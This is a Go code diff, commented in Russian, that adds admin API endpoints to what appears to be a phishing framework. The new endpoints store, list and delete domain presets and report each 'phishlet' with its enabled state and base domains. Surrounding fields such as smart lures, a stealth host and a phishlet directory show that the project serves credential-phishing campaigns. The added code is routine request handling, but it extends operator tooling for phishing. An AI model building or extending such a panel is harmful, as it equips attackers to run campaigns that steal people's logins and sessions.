@@ -21,6 +21,13 @@ import (
 	"github.com/phantom-v2/phantom/internal/webui"
 )
 
+// DomainPresets — сохраненные домены (реализация *sqlite.DB).
+type DomainPresets interface {
+	AddDomainPreset(domain string) error
+	ListDomainPresets() ([]string, error)
+	RemoveDomainPreset(domain string) error
+}
+
 type Deps struct {
 	StealthHost string
 	CAFile      string
@@ -33,6 +40,7 @@ type Deps struct {
 	OnSmart     func(in SmartLureIn) // персист smart-lure (main wires sqlite)
 	NodeID      string               // node_id в stats (мульти-нода)
 	Config      func() map[string]any
+	Presets     DomainPresets
 	PhishDir    string // dir для reload/persist YAML (hot-reload)
 	OnReload    func() error         // Reload стора (main wires store.Reload)
 	OnUpsert    func(yaml []byte) (string, error)
@@ -83,6 +91,60 @@ func Handler(d Deps) http.Handler {
 			"uptime_s":  int(time.Since(d.StartedAt).Seconds()),
 		})
 	}))
+	// Пресеты доменов для выбора из списка (меню).
+	mux.HandleFunc("/api/v1/domains", guard(func(w http.ResponseWriter, r *http.Request) {
+		if d.Presets == nil {
+			http.Error(w, "presets disabled", http.StatusNotImplemented)
+			return
+		}
+		switch r.Method {
+		case http.MethodGet:
+			list, err := d.Presets.ListDomainPresets()
+			if err != nil {
+				http.Error(w, err.Error(), http.StatusInternalServerError)
+				return
+			}
+			if list == nil {
+				list = []string{}
+			}
+			_ = json.NewEncoder(w).Encode(list)
+		case http.MethodPost:
+			var in struct {
+				Domain string `json:"domain"`
+			}
+			if err := json.NewDecoder(io.LimitReader(r.Body, 4096)).Decode(&in); err != nil || in.Domain == "" {
+				http.Error(w, "need domain", http.StatusBadRequest)
+				return
+			}
+			if err := d.Presets.AddDomainPreset(in.Domain); err != nil {
+				http.Error(w, err.Error(), http.StatusBadRequest)
+				return
+			}
+			w.WriteHeader(http.StatusCreated)
+		default:
+			http.Error(w, "method", http.StatusMethodNotAllowed)
+		}
+	}))
+	mux.HandleFunc("/api/v1/domains/", guard(func(w http.ResponseWriter, r *http.Request) {
+		if r.Method != http.MethodDelete {
+			http.Error(w, "method", http.StatusMethodNotAllowed)
+			return
+		}
+		if d.Presets == nil {
+			http.Error(w, "presets disabled", http.StatusNotImplemented)
+			return
+		}
+		domain := strings.Trim(strings.TrimPrefix(r.URL.Path, "/api/v1/domains/"), "/")
+		if domain == "" || strings.Contains(domain, "/") {
+			http.Error(w, "bad domain", http.StatusBadRequest)
+			return
+		}
+		if err := d.Presets.RemoveDomainPreset(domain); err != nil {
+			http.Error(w, err.Error(), http.StatusInternalServerError)
+			return
+		}
+		w.WriteHeader(http.StatusNoContent)
+	}))
 	// Конфиг сервера для меню (БЕЗ секретов: токены/ключи не отдаем).
 	mux.HandleFunc("/api/v1/config", guard(func(w http.ResponseWriter, _ *http.Request) {
 		cfg := map[string]any{"node": d.NodeID}
@@ -92,6 +154,18 @@ func Handler(d Deps) http.Handler {
 			}
 		}
 		_ = json.NewEncoder(w).Encode(cfg)
+	}))
+	mux.HandleFunc("/api/v1/phishlets/detail", guard(func(w http.ResponseWriter, _ *http.Request) {
+		type row struct {
+			ID      string   `json:"id"`
+			Enabled bool     `json:"enabled"`
+			Domains []string `json:"domains"`
+		}
+		out := []row{}
+		for _, p := range d.Store.All() {
+			out = append(out, row{p.ID, p.Enabled, append([]string(nil), p.BaseDomains...)})
+		}
+		_ = json.NewEncoder(w).Encode(out)
 	}))
 	mux.HandleFunc("/api/v1/phishlets", guard(func(w http.ResponseWriter, r *http.Request) {		switch r.Method {
 		case http.MethodGet:
